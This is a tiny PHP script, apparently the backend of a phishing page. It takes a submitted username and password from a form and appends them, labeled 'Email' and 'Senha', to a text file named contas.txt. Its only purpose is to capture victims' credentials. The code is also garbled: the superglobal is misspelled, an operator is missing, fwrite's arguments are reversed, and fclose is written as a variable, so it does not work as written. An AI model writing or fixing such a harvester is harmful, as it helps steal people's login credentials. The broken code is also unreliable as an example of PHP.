<?php
$id = $POST['user'];
$senha = $POST['pass'];
$tudo = "Email : ".$id " Senha: ".pass;
$open = fopen("contas.txt","a");
$write = fwrite($tudo,$open);
$fclose($open);
?>